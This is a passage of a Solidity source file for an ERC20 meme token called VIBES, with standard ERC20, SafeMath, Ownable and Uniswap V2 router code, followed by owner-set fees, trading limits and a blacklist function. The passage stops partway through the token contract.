1 /**
2 Your friendly neighbourhood developer here..
3 
4 Let us gather together once again and enjoy the good times.
5 
6 Let us breathe positivity into the cryptosphere in a time where emotions can overcome wisdom. 
7 
8 Good $VIBES only.
9 **/
10 
11 // SPDX-License-Identifier: Unlicensed
12 pragma solidity 0.8.13;
13  
14 abstract contract Context {
15     function _msgSender() internal view virtual returns (address) {
16         return msg.sender;
17     }
18  
19     function _msgData() internal view virtual returns (bytes calldata) {
20         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
21         return msg.data;
22     }
23 }
24  
25 interface IUniswapV2Pair {
26     event Approval(address indexed owner, address indexed spender, uint value);
27     event Transfer(address indexed from, address indexed to, uint value);
28  
29     function name() external pure returns (string memory);
30     function symbol() external pure returns (string memory);
31     function decimals() external pure returns (uint8);
32     function totalSupply() external view returns (uint);
33     function balanceOf(address owner) external view returns (uint);
34     function allowance(address owner, address spender) external view returns (uint);
35  
36     function approve(address spender, uint value) external returns (bool);
37     function transfer(address to, uint value) external returns (bool);
38     function transferFrom(address from, address to, uint value) external returns (bool);
39  
40     function DOMAIN_SEPARATOR() external view returns (bytes32);
41     function PERMIT_TYPEHASH() external pure returns (bytes32);
42     function nonces(address owner) external view returns (uint);
43  
44     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
45  
46     event Mint(address indexed sender, uint amount0, uint amount1);
47     event Swap(
48         address indexed sender,
49         uint amount0In,
50         uint amount1In,
51         uint amount0Out,
52         uint amount1Out,
53         address indexed to
54     );
55     event Sync(uint112 reserve0, uint112 reserve1);
56  
57     function MINIMUM_LIQUIDITY() external pure returns (uint);
58     function factory() external view returns (address);
59     function token0() external view returns (address);
60     function token1() external view returns (address);
61     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
62     function price0CumulativeLast() external view returns (uint);
63     function price1CumulativeLast() external view returns (uint);
64     function kLast() external view returns (uint);
65  
66     function mint(address to) external returns (uint liquidity);
67     function burn(address to) external returns (uint amount0, uint amount1);
68     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
69     function skim(address to) external;
70     function sync() external;
71  
72     function initialize(address, address) external;
73 }
74  
75 interface IUniswapV2Factory {
76     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
77  
78     function feeTo() external view returns (address);
79     function feeToSetter() external view returns (address);
80  
81     function getPair(address tokenA, address tokenB) external view returns (address pair);
82     function allPairs(uint) external view returns (address pair);
83     function allPairsLength() external view returns (uint);
84  
85     function createPair(address tokenA, address tokenB) external returns (address pair);
86  
87     function setFeeTo(address) external;
88     function setFeeToSetter(address) external;
89 }
90  
91 interface IERC20 {
92     /**
93      * @dev Returns the amount of tokens in existence.
94      */
95     function totalSupply() external view returns (uint256);
96  
97     /**
98      * @dev Returns the amount of tokens owned by `account`.
99      */
100     function balanceOf(address account) external view returns (uint256);
101  
102     /**
103      * @dev Moves `amount` tokens from the caller's account to `recipient`.
104      *
105      * Returns a boolean value indicating whether the operation succeeded.
106      *
107      * Emits a {Transfer} event.
108      */
109     function transfer(address recipient, uint256 amount) external returns (bool);
110  
111     /**
112      * @dev Returns the remaining number of tokens that `spender` will be
113      * allowed to spend on behalf of `owner` through {transferFrom}. This is
114      * zero by default.
115      *
116      * This value changes when {approve} or {transferFrom} are called.
117      */
118     function allowance(address owner, address spender) external view returns (uint256);
119  
120     /**
121      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
122      *
123      * Returns a boolean value indicating whether the operation succeeded.
124      *
125      * IMPORTANT: Beware that changing an allowance with this method brings the risk
126      * that someone may use both the old and the new allowance by unfortunate
127      * transaction ordering. One possible solution to mitigate this race
128      * condition is to first reduce the spender's allowance to 0 and set the
129      * desired value afterwards:
130      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
131      *
132      * Emits an {Approval} event.
133      */
134     function approve(address spender, uint256 amount) external returns (bool);
135  
136     /**
137      * @dev Moves `amount` tokens from `sender` to `recipient` using the
138      * allowance mechanism. `amount` is then deducted from the caller's
139      * allowance.
140      *
141      * Returns a boolean value indicating whether the operation succeeded.
142      *
143      * Emits a {Transfer} event.
144      */
145     function transferFrom(
146         address sender,
147         address recipient,
148         uint256 amount
149     ) external returns (bool);
150  
151     /**
152      * @dev Emitted when `value` tokens are moved from one account (`from`) to
153      * another (`to`).
154      *
155      * Note that `value` may be zero.
156      */
157     event Transfer(address indexed from, address indexed to, uint256 value);
158  
159     /**
160      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
161      * a call to {approve}. `value` is the new allowance.
162      */
163     event Approval(address indexed owner, address indexed spender, uint256 value);
164 }
165  
166 interface IERC20Metadata is IERC20 {
167     /**
168      * @dev Returns the name of the token.
169      */
170     function name() external view returns (string memory);
171  
172     /**
173      * @dev Returns the symbol of the token.
174      */
175     function symbol() external view returns (string memory);
176  
177     /**
178      * @dev Returns the decimals places of the token.
179      */
180     function decimals() external view returns (uint8);
181 }
182  
183  
184 contract ERC20 is Context, IERC20, IERC20Metadata {
185     using SafeMath for uint256;
186  
187     mapping(address => uint256) private _balances;
188  
189     mapping(address => mapping(address => uint256)) private _allowances;
190  
191     uint256 private _totalSupply;
192  
193     string private _name;
194     string private _symbol;
195  
196     /**
197      * @dev Sets the values for {name} and {symbol}.
198      *
199      * The default value of {decimals} is 18. To select a different value for
200      * {decimals} you should overload it.
201      *
202      * All two of these values are immutable: they can only be set once during
203      * construction.
204      */
205     constructor(string memory name_, string memory symbol_) {
206         _name = name_;
207         _symbol = symbol_;
208     }
209  
210     /**
211      * @dev Returns the name of the token.
212      */
213     function name() public view virtual override returns (string memory) {
214         return _name;
215     }
216  
217     /**
218      * @dev Returns the symbol of the token, usually a shorter version of the
219      * name.
220      */
221     function symbol() public view virtual override returns (string memory) {
222         return _symbol;
223     }
224  
225     /**
226      * @dev Returns the number of decimals used to get its user representation.
227      * For example, if `decimals` equals `2`, a balance of `505` tokens should
228      * be displayed to a user as `5,05` (`505 / 10 ** 2`).
229      *
230      * Tokens usually opt for a value of 18, imitating the relationship between
231      * Ether and Wei. This is the value {ERC20} uses, unless this function is
232      * overridden;
233      *
234      * NOTE: This information is only used for _display_ purposes: it in
235      * no way affects any of the arithmetic of the contract, including
236      * {IERC20-balanceOf} and {IERC20-transfer}.
237      */
238     function decimals() public view virtual override returns (uint8) {
239         return 18;
240     }
241  
242     /**
243      * @dev See {IERC20-totalSupply}.
244      */
245     function totalSupply() public view virtual override returns (uint256) {
246         return _totalSupply;
247     }
248  
249     /**
250      * @dev See {IERC20-balanceOf}.
251      */
252     function balanceOf(address account) public view virtual override returns (uint256) {
253         return _balances[account];
254     }
255  
256     /**
257      * @dev See {IERC20-transfer}.
258      *
259      * Requirements:
260      *
261      * - `recipient` cannot be the zero address.
262      * - the caller must have a balance of at least `amount`.
263      */
264     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
265         _transfer(_msgSender(), recipient, amount);
266         return true;
267     }
268  
269     /**
270      * @dev See {IERC20-allowance}.
271      */
272     function allowance(address owner, address spender) public view virtual override returns (uint256) {
273         return _allowances[owner][spender];
274     }
275  
276     /**
277      * @dev See {IERC20-approve}.
278      *
279      * Requirements:
280      *
281      * - `spender` cannot be the zero address.
282      */
283     function approve(address spender, uint256 amount) public virtual override returns (bool) {
284         _approve(_msgSender(), spender, amount);
285         return true;
286     }
287  
288     /**
289      * @dev See {IERC20-transferFrom}.
290      *
291      * Emits an {Approval} event indicating the updated allowance. This is not
292      * required by the EIP. See the note at the beginning of {ERC20}.
293      *
294      * Requirements:
295      *
296      * - `sender` and `recipient` cannot be the zero address.
297      * - `sender` must have a balance of at least `amount`.
298      * - the caller must have allowance for ``sender``'s tokens of at least
299      * `amount`.
300      */
301     function transferFrom(
302         address sender,
303         address recipient,
304         uint256 amount
305     ) public virtual override returns (bool) {
306         _transfer(sender, recipient, amount);
307         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
308         return true;
309     }
310  
311     /**
312      * @dev Atomically increases the allowance granted to `spender` by the caller.
313      *
314      * This is an alternative to {approve} that can be used as a mitigation for
315      * problems described in {IERC20-approve}.
316      *
317      * Emits an {Approval} event indicating the updated allowance.
318      *
319      * Requirements:
320      *
321      * - `spender` cannot be the zero address.
322      */
323     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
324         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
325         return true;
326     }
327  
328     /**
329      * @dev Atomically decreases the allowance granted to `spender` by the caller.
330      *
331      * This is an alternative to {approve} that can be used as a mitigation for
332      * problems described in {IERC20-approve}.
333      *
334      * Emits an {Approval} event indicating the updated allowance.
335      *
336      * Requirements:
337      *
338      * - `spender` cannot be the zero address.
339      * - `spender` must have allowance for the caller of at least
340      * `subtractedValue`.
341      */
342     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
343         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
344         return true;
345     }
346  
347     /**
348      * @dev Moves tokens `amount` from `sender` to `recipient`.
349      *
350      * This is internal function is equivalent to {transfer}, and can be used to
351      * e.g. implement automatic token fees, slashing mechanisms, etc.
352      *
353      * Emits a {Transfer} event.
354      *
355      * Requirements:
356      *
357      * - `sender` cannot be the zero address.
358      * - `recipient` cannot be the zero address.
359      * - `sender` must have a balance of at least `amount`.
360      */
361     function _transfer(
362         address sender,
363         address recipient,
364         uint256 amount
365     ) internal virtual {
366         require(sender != address(0), "ERC20: transfer from the zero address");
367         require(recipient != address(0), "ERC20: transfer to the zero address");
368  
369         _beforeTokenTransfer(sender, recipient, amount);
370  
371         _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
372         _balances[recipient] = _balances[recipient].add(amount);
373         emit Transfer(sender, recipient, amount);
374     }
375  
376     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
377      * the total supply.
378      *
379      * Emits a {Transfer} event with `from` set to the zero address.
380      *
381      * Requirements:
382      *
383      * - `account` cannot be the zero address.
384      */
385     function _mint(address account, uint256 amount) internal virtual {
386         require(account != address(0), "ERC20: mint to the zero address");
387  
388         _beforeTokenTransfer(address(0), account, amount);
389  
390         _totalSupply = _totalSupply.add(amount);
391         _balances[account] = _balances[account].add(amount);
392         emit Transfer(address(0), account, amount);
393     }
394  
395     /**
396      * @dev Destroys `amount` tokens from `account`, reducing the
397      * total supply.
398      *
399      * Emits a {Transfer} event with `to` set to the zero address.
400      *
401      * Requirements:
402      *
403      * - `account` cannot be the zero address.
404      * - `account` must have at least `amount` tokens.
405      */
406     function _burn(address account, uint256 amount) internal virtual {
407         require(account != address(0), "ERC20: burn from the zero address");
408  
409         _beforeTokenTransfer(account, address(0), amount);
410  
411         _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
412         _totalSupply = _totalSupply.sub(amount);
413         emit Transfer(account, address(0), amount);
414     }
415  
416     /**
417      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
418      *
419      * This internal function is equivalent to `approve`, and can be used to
420      * e.g. set automatic allowances for certain subsystems, etc.
421      *
422      * Emits an {Approval} event.
423      *
424      * Requirements:
425      *
426      * - `owner` cannot be the zero address.
427      * - `spender` cannot be the zero address.
428      */
429     function _approve(
430         address owner,
431         address spender,
432         uint256 amount
433     ) internal virtual {
434         require(owner != address(0), "ERC20: approve from the zero address");
435         require(spender != address(0), "ERC20: approve to the zero address");
436  
437         _allowances[owner][spender] = amount;
438         emit Approval(owner, spender, amount);
439     }
440  
441     /**
442      * @dev Hook that is called before any transfer of tokens. This includes
443      * minting and burning.
444      *
445      * Calling conditions:
446      *
447      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
448      * will be to transferred to `to`.
449      * - when `from` is zero, `amount` tokens will be minted for `to`.
450      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
451      * - `from` and `to` are never both zero.
452      *
453      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
454      */
455     function _beforeTokenTransfer(
456         address from,
457         address to,
458         uint256 amount
459     ) internal virtual {}
460 }
461  
462 library SafeMath {
463     /**
464      * @dev Returns the addition of two unsigned integers, reverting on
465      * overflow.
466      *
467      * Counterpart to Solidity's `+` operator.
468      *
469      * Requirements:
470      *
471      * - Addition cannot overflow.
472      */
473     function add(uint256 a, uint256 b) internal pure returns (uint256) {
474         uint256 c = a + b;
475         require(c >= a, "SafeMath: addition overflow");
476  
477         return c;
478     }
479  
480     /**
481      * @dev Returns the subtraction of two unsigned integers, reverting on
482      * overflow (when the result is negative).
483      *
484      * Counterpart to Solidity's `-` operator.
485      *
486      * Requirements:
487      *
488      * - Subtraction cannot overflow.
489      */
490     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
491         return sub(a, b, "SafeMath: subtraction overflow");
492     }
493  
494     /**
495      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
496      * overflow (when the result is negative).
497      *
498      * Counterpart to Solidity's `-` operator.
499      *
500      * Requirements:
501      *
502      * - Subtraction cannot overflow.
503      */
504     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
505         require(b <= a, errorMessage);
506         uint256 c = a - b;
507  
508         return c;
509     }
510  
511     /**
512      * @dev Returns the multiplication of two unsigned integers, reverting on
513      * overflow.
514      *
515      * Counterpart to Solidity's `*` operator.
516      *
517      * Requirements:
518      *
519      * - Multiplication cannot overflow.
520      */
521     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
522         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
523         // benefit is lost if 'b' is also tested.
524         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
525         if (a == 0) {
526             return 0;
527         }
528  
529         uint256 c = a * b;
530         require(c / a == b, "SafeMath: multiplication overflow");
531  
532         return c;
533     }
534  
535     /**
536      * @dev Returns the integer division of two unsigned integers. Reverts on
537      * division by zero. The result is rounded towards zero.
538      *
539      * Counterpart to Solidity's `/` operator. Note: this function uses a
540      * `revert` opcode (which leaves remaining gas untouched) while Solidity
541      * uses an invalid opcode to revert (consuming all remaining gas).
542      *
543      * Requirements:
544      *
545      * - The divisor cannot be zero.
546      */
547     function div(uint256 a, uint256 b) internal pure returns (uint256) {
548         return div(a, b, "SafeMath: division by zero");
549     }
550  
551     /**
552      * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
553      * division by zero. The result is rounded towards zero.
554      *
555      * Counterpart to Solidity's `/` operator. Note: this function uses a
556      * `revert` opcode (which leaves remaining gas untouched) while Solidity
557      * uses an invalid opcode to revert (consuming all remaining gas).
558      *
559      * Requirements:
560      *
561      * - The divisor cannot be zero.
562      */
563     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
564         require(b > 0, errorMessage);
565         uint256 c = a / b;
566         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
567  
568         return c;
569     }
570  
571     /**
572      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
573      * Reverts when dividing by zero.
574      *
575      * Counterpart to Solidity's `%` operator. This function uses a `revert`
576      * opcode (which leaves remaining gas untouched) while Solidity uses an
577      * invalid opcode to revert (consuming all remaining gas).
578      *
579      * Requirements:
580      *
581      * - The divisor cannot be zero.
582      */
583     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
584         return mod(a, b, "SafeMath: modulo by zero");
585     }
586  
587     /**
588      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
589      * Reverts with custom message when dividing by zero.
590      *
591      * Counterpart to Solidity's `%` operator. This function uses a `revert`
592      * opcode (which leaves remaining gas untouched) while Solidity uses an
593      * invalid opcode to revert (consuming all remaining gas).
594      *
595      * Requirements:
596      *
597      * - The divisor cannot be zero.
598      */
599     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
600         require(b != 0, errorMessage);
601         return a % b;
602     }
603 }
604  
605 contract Ownable is Context {
606     address private _owner;
607  
608     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
609  
610     /**
611      * @dev Initializes the contract setting the deployer as the initial owner.
612      */
613     constructor () {
614         address msgSender = _msgSender();
615         _owner = msgSender;
616         emit OwnershipTransferred(address(0), msgSender);
617     }
618  
619     /**
620      * @dev Returns the address of the current owner.
621      */
622     function owner() public view returns (address) {
623         return _owner;
624     }
625  
626     /**
627      * @dev Throws if called by any account other than the owner.
628      */
629     modifier onlyOwner() {
630         require(_owner == _msgSender(), "Ownable: caller is not the owner");
631         _;
632     }
633  
634     /**
635      * @dev Leaves the contract without owner. It will not be possible to call
636      * `onlyOwner` functions anymore. Can only be called by the current owner.
637      *
638      * NOTE: Renouncing ownership will leave the contract without an owner,
639      * thereby removing any functionality that is only available to the owner.
640      */
641     function renounceOwnership() public virtual onlyOwner {
642         emit OwnershipTransferred(_owner, address(0));
643         _owner = address(0);
644     }
645  
646     /**
647      * @dev Transfers ownership of the contract to a new account (`newOwner`).
648      * Can only be called by the current owner.
649      */
650     function transferOwnership(address newOwner) public virtual onlyOwner {
651         require(newOwner != address(0), "Ownable: new owner is the zero address");
652         emit OwnershipTransferred(_owner, newOwner);
653         _owner = newOwner;
654     }
655 }
656  
657  
658 library SafeMathInt {
659     int256 private constant MIN_INT256 = int256(1) << 255;
660     int256 private constant MAX_INT256 = ~(int256(1) << 255);
661  
662     /**
663      * @dev Multiplies two int256 variables and fails on overflow.
664      */
665     function mul(int256 a, int256 b) internal pure returns (int256) {
666         int256 c = a * b;
667  
668         // Detect overflow when multiplying MIN_INT256 with -1
669         require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
670         require((b == 0) || (c / b == a));
671         return c;
672     }
673  
674     /**
675      * @dev Division of two int256 variables and fails on overflow.
676      */
677     function div(int256 a, int256 b) internal pure returns (int256) {
678         // Prevent overflow when dividing MIN_INT256 by -1
679         require(b != -1 || a != MIN_INT256);
680  
681         // Solidity already throws when dividing by 0.
682         return a / b;
683     }
684  
685     /**
686      * @dev Subtracts two int256 variables and fails on overflow.
687      */
688     function sub(int256 a, int256 b) internal pure returns (int256) {
689         int256 c = a - b;
690         require((b >= 0 && c <= a) || (b < 0 && c > a));
691         return c;
692     }
693  
694     /**
695      * @dev Adds two int256 variables and fails on overflow.
696      */
697     function add(int256 a, int256 b) internal pure returns (int256) {
698         int256 c = a + b;
699         require((b >= 0 && c >= a) || (b < 0 && c < a));
700         return c;
701     }
702  
703     /**
704      * @dev Converts to absolute value, and fails on overflow.
705      */
706     function abs(int256 a) internal pure returns (int256) {
707         require(a != MIN_INT256);
708         return a < 0 ? -a : a;
709     }
710  
711  
712     function toUint256Safe(int256 a) internal pure returns (uint256) {
713         require(a >= 0);
714         return uint256(a);
715     }
716 }
717  
718 library SafeMathUint {
719   function toInt256Safe(uint256 a) internal pure returns (int256) {
720     int256 b = int256(a);
721     require(b >= 0);
722     return b;
723   }
724 }
725  
726  
727 interface IUniswapV2Router01 {
728     function factory() external pure returns (address);
729     function WETH() external pure returns (address);
730  
731     function addLiquidity(
732         address tokenA,
733         address tokenB,
734         uint amountADesired,
735         uint amountBDesired,
736         uint amountAMin,
737         uint amountBMin,
738         address to,
739         uint deadline
740     ) external returns (uint amountA, uint amountB, uint liquidity);
741     function addLiquidityETH(
742         address token,
743         uint amountTokenDesired,
744         uint amountTokenMin,
745         uint amountETHMin,
746         address to,
747         uint deadline
748     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
749     function removeLiquidity(
750         address tokenA,
751         address tokenB,
752         uint liquidity,
753         uint amountAMin,
754         uint amountBMin,
755         address to,
756         uint deadline
757     ) external returns (uint amountA, uint amountB);
758     function removeLiquidityETH(
759         address token,
760         uint liquidity,
761         uint amountTokenMin,
762         uint amountETHMin,
763         address to,
764         uint deadline
765     ) external returns (uint amountToken, uint amountETH);
766     function removeLiquidityWithPermit(
767         address tokenA,
768         address tokenB,
769         uint liquidity,
770         uint amountAMin,
771         uint amountBMin,
772         address to,
773         uint deadline,
774         bool approveMax, uint8 v, bytes32 r, bytes32 s
775     ) external returns (uint amountA, uint amountB);
776     function removeLiquidityETHWithPermit(
777         address token,
778         uint liquidity,
779         uint amountTokenMin,
780         uint amountETHMin,
781         address to,
782         uint deadline,
783         bool approveMax, uint8 v, bytes32 r, bytes32 s
784     ) external returns (uint amountToken, uint amountETH);
785     function swapExactTokensForTokens(
786         uint amountIn,
787         uint amountOutMin,
788         address[] calldata path,
789         address to,
790         uint deadline
791     ) external returns (uint[] memory amounts);
792     function swapTokensForExactTokens(
793         uint amountOut,
794         uint amountInMax,
795         address[] calldata path,
796         address to,
797         uint deadline
798     ) external returns (uint[] memory amounts);
799     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
800         external
801         payable
802         returns (uint[] memory amounts);
803     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
804         external
805         returns (uint[] memory amounts);
806     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
807         external
808         returns (uint[] memory amounts);
809     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
810         external
811         payable
812         returns (uint[] memory amounts);
813  
814     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
815     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
816     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
817     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
818     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
819 }
820  
821 interface IUniswapV2Router02 is IUniswapV2Router01 {
822     function removeLiquidityETHSupportingFeeOnTransferTokens(
823         address token,
824         uint liquidity,
825         uint amountTokenMin,
826         uint amountETHMin,
827         address to,
828         uint deadline
829     ) external returns (uint amountETH);
830     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
831         address token,
832         uint liquidity,
833         uint amountTokenMin,
834         uint amountETHMin,
835         address to,
836         uint deadline,
837         bool approveMax, uint8 v, bytes32 r, bytes32 s
838     ) external returns (uint amountETH);
839  
840     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
841         uint amountIn,
842         uint amountOutMin,
843         address[] calldata path,
844         address to,
845         uint deadline
846     ) external;
847     function swapExactETHForTokensSupportingFeeOnTransferTokens(
848         uint amountOutMin,
849         address[] calldata path,
850         address to,
851         uint deadline
852     ) external payable;
853     function swapExactTokensForETHSupportingFeeOnTransferTokens(
854         uint amountIn,
855         uint amountOutMin,
856         address[] calldata path,
857         address to,
858         uint deadline
859     ) external;
860 }
861  
862 contract VIBES is ERC20, Ownable {
863     using SafeMath for uint256;
864  
865     IUniswapV2Router02 public immutable uniswapV2Router;
866     address public immutable uniswapV2Pair;
867  
868     bool private swapping;
869  
870     address private devWallet;
871  
872     uint256 public maxTransactionAmount;
873     uint256 public swapTokensAtAmount;
874     uint256 public maxWallet;
875  
876     bool public limitsInEffect = true;
877     bool public tradingActive = false;
878     bool public swapEnabled = false;
879  
880      // Anti-bot and anti-whale mappings and variables
881     mapping(address => uint256) private _holderLastTransferTimestamp; // to hold last Transfers temporarily during launch
882  
883     // Seller Map
884     mapping (address => uint256) private _holderFirstBuyTimestamp;
885  
886     // Blacklist Map
887     mapping (address => bool) private _blacklist;
888     bool public transferDelayEnabled = true;
889  
890     uint256 public buyTotalFees;
891     uint256 public buyLiquidityFee;
892     uint256 public buyDevFee;
893  
894     uint256 public sellTotalFees;
895     uint256 public sellLiquidityFee;
896     uint256 public sellDevFee;
897  
898     uint256 public tokensForLiquidity;
899     uint256 public tokensForDev;
900  
901     // block number of opened trading
902     uint256 launchedAt;
903  
904     /******************/
905  
906     // exclude from fees and max transaction amount
907     mapping (address => bool) private _isExcludedFromFees;
908     mapping (address => bool) public _isExcludedMaxTransactionAmount;
909  
910     // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
911     // could be subject to a maximum transfer amount
912     mapping (address => bool) public automatedMarketMakerPairs;
913  
914     event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
915  
916     event ExcludeFromFees(address indexed account, bool isExcluded);
917  
918     event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
919  
920     event devWalletUpdated(address indexed newWallet, address indexed oldWallet);
921  
922     event SwapAndLiquify(
923         uint256 tokensSwapped,
924         uint256 ethReceived,
925         uint256 tokensIntoLiquidity
926     );
927  
928     event AutoNukeLP();
929  
930     event ManualNukeLP();
931  
932     constructor() ERC20("VIBES", "$VIBES") {
933  
934         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
935  
936         excludeFromMaxTransaction(address(_uniswapV2Router), true);
937         uniswapV2Router = _uniswapV2Router;
938  
939         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
940         excludeFromMaxTransaction(address(uniswapV2Pair), true);
941         _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
942  
943         uint256 _buyLiquidityFee = 2; //auto-LP
944         uint256 _buyDevFee = 1; //$VIBES buyback + burn
945  
946         uint256 _sellLiquidityFee = 2; //auto-LP
947         uint256 _sellDevFee = 1; //$VIBES buyback + burn
948  
949         uint256 totalSupply = 1 * 10 ** 12 * 10 ** decimals(); // 1 Trillion GOOD $VIBES ONLY
950  
951         maxTransactionAmount = 10 * 10 ** 9 * 10 ** decimals(); // 1% max TXN
952         maxWallet = 20 * 10 ** 9 * 10 ** decimals(); // 2% max WALLET
953         swapTokensAtAmount = totalSupply * 10 / 10000; // 0.1% swap wallet
954  
955         buyLiquidityFee = _buyLiquidityFee;
956         buyDevFee = _buyDevFee;
957         buyTotalFees = buyLiquidityFee + buyDevFee;
958  
959         sellLiquidityFee = _sellLiquidityFee;
960         sellDevFee = _sellDevFee;
961         sellTotalFees = sellLiquidityFee + sellDevFee;
962  
963         devWallet = address(0x002Ebd5BFA175c547DE5706Df55c0A674B18aE04); // set as dev wallet
964  
965         // exclude from paying fees or having max transaction amount
966         excludeFromFees(owner(), true);
967         excludeFromFees(address(this), true);
968         excludeFromFees(address(0xdead), true);
969  
970         excludeFromMaxTransaction(owner(), true);
971         excludeFromMaxTransaction(address(this), true);
972         excludeFromMaxTransaction(address(0xdead), true);
973  
974         /*
975             _mint is an internal function in ERC20.sol that is only called here,
976             and CANNOT be called ever again
977         */
978         _mint(msg.sender, totalSupply);
979     }
980  
981     receive() external payable {
982  
983     }
984  
985     // once enabled, can never be turned off
986     function enableTrading() external onlyOwner {
987         tradingActive = true;
988         swapEnabled = true;
989         launchedAt = block.number;
990     }
991  
992     // remove limits after token is stable
993     function removeLimits() external onlyOwner returns (bool){
994         limitsInEffect = false;
995         return true;
996     }
997  
998     // disable Transfer delay - cannot be reenabled
999     function disableTransferDelay() external onlyOwner returns (bool){
1000         transferDelayEnabled = false;
1001         return true;
1002     }
1003  
1004      // change the minimum amount of tokens to sell from fees
1005     function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner returns (bool){
1006         require(newAmount >= totalSupply() * 1 / 100000, "Swap amount cannot be lower than 0.001% total supply.");
1007         require(newAmount <= totalSupply() * 5 / 1000, "Swap amount cannot be higher than 0.5% total supply.");
1008         swapTokensAtAmount = newAmount;
1009         return true;
1010     }
1011  
1012     function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
1013         require(newNum >= (totalSupply() * 1 / 1000)/1e18, "Cannot set maxTransactionAmount lower than 0.1%");
1014         maxTransactionAmount = newNum * (10**18);
1015     }
1016  
1017     function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
1018         require(newNum >= (totalSupply() * 5 / 1000)/1e18, "Cannot set maxWallet lower than 0.5%");
1019         maxWallet = newNum * (10**18);
1020     }
1021  
1022     function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {
1023         _isExcludedMaxTransactionAmount[updAds] = isEx;
1024     }
1025  
1026     // only use to disable contract sales if absolutely necessary (emergency use only)
1027     function updateSwapEnabled(bool enabled) external onlyOwner(){
1028         swapEnabled = enabled;
1029     }
1030  
1031     function updateBuyFees(uint256 _liquidityFee, uint256 _devFee) external onlyOwner {
1032         buyLiquidityFee = _liquidityFee;
1033         buyDevFee = _devFee;
1034         buyTotalFees = buyLiquidityFee + buyDevFee;
1035         require(buyTotalFees <= 3, "Must keep fees at 3% or less");
1036     }
1037  
1038     function updateSellFees(uint256 _liquidityFee, uint256 _devFee) external onlyOwner {
1039         sellLiquidityFee = _liquidityFee;
1040         sellDevFee = _devFee;
1041         sellTotalFees = sellLiquidityFee + sellDevFee;
1042         require(sellTotalFees <= 3, "Must keep fees at 3% or less");
1043     }
1044  
1045     function excludeFromFees(address account, bool excluded) public onlyOwner {
1046         _isExcludedFromFees[account] = excluded;
1047         emit ExcludeFromFees(account, excluded);
1048     }
1049  
1050     function blacklistAccount (address account, bool isBlacklisted) public onlyOwner {
1051         _blacklist[account] = isBlacklisted;
1052     }
1053  
1054     function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
1055         require(pair != uniswapV2Pair, "The pair cannot be removed from automatedMarketMakerPairs");
1056  
1057         _setAutomatedMarketMakerPair(pair, value);
1058     }
1059  
1060     function _setAutomatedMarketMakerPair(address pair, bool value) private {
1061         automatedMarketMakerPairs[pair] = value;
1062  
1063         emit SetAutomatedMarketMakerPair(pair, value);
1064     }
1065  
1066     function updateDevWallet(address newWallet) external onlyOwner {
1067         emit devWalletUpdated(newWallet, devWallet);
1068         devWallet = newWallet;
1069     }
1070  
